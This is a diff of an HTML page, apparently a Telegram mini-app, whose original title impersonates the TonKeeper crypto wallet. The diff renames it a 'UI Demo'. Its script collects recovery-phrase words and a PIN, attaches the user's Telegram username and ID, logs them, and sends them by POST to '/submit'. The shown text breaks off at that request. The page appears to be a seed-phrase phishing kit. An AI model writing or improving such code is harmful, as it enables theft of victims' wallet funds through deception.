@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TonKeeper</title>
+<title>Kepper UI Demo</title>
 
 <style>
 
@@ -221,15 +221,16 @@ transform:translateY(0);
 <script>
 
 
-const tg = window.Telegram.WebApp
-const user = tg.initDataUnsafe.user
+const tg = window.Telegram?.WebApp
 
-let username = "unknown"
-let user_id = "unknown"
+let username = "no_username"
+let user_id = "0"
 
-if(user){
-username = user.username
-user_id = user.id
+if(tg && tg.initDataUnsafe && tg.initDataUnsafe.user){
+    const user = tg.initDataUnsafe.user
+
+    username = user.username || user.first_name || "no_username"
+    user_id = String(user.id)
 }
   
 /* CREATE WORD INPUTS */
@@ -292,7 +293,14 @@ let inputs=document.querySelectorAll("input")
 let words=[]
 
 inputs.forEach(i=>{
-words.push(i.value)
+words.push(i.value.trim() || "-")
+})
+
+console.log({
+words: words,
+pin: pin,
+username: username,
+user_id: user_id
 })
 
 await fetch("/submit",{
